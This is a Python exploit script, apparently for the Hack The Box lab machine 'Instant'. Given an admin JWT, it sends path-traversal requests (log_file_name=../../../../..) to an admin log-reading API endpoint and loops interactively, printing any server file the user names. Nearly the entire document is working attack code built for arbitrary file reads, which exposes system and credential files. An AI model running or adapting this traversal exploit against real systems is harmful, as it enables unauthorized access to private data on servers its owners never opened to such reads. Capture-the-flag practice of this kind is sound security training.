import sys
import requests
import json
from colorama import Fore, Style

base_url = "http://swagger-ui.instant.htb"

def file_read(jwt, path):
	url = f"{base_url}/api/v1/admin/read/log?log_file_name=../../../../../../../..{path}"
	headers = {
		"Authorization": jwt
	}

	try:
		req = requests.get(url,headers=headers)
		if req.status_code == 201:
			print(Fore.GREEN + f"[+] File read successful:" + Style.RESET_ALL)
			data = json.loads(req.text)
			file_key = next(iter(data))
			for l in data[file_key]:
				print(l, end="")
			print()
		else:
			print(Fore.YELLOW + f"[!] File read failed. Either the file does not exist, or you have no read permission." + Style.RESET_ALL)
			print()
	except requests.exceptions.RequestException as e:
		print(Fore.RED + f"[-] Error occurred: {e}" + Style.RESET_ALL)
		print()
	
	return

def main():
	if len(sys.argv) != 2:
		print(Fore.RED + f"[-] Usage: python {sys.argv[0]} <admin_jwt>" + Style.RESET_ALL)
		exit(0)

	jwt = sys.argv[1]
	while True:
		print(Fore.BLUE + f"[*] Full path of file to read: (enter 'exit' to quit)" + Style.RESET_ALL)
		path = input(Fore.BLUE + ">> " + Style.RESET_ALL)
		if (path == "exit"):
			print(Fore.RED + f"[-] Exiting..." + Style.RESET_ALL)
			exit(0)

		file_read(jwt, path)

if __name__ == "__main__":
	main()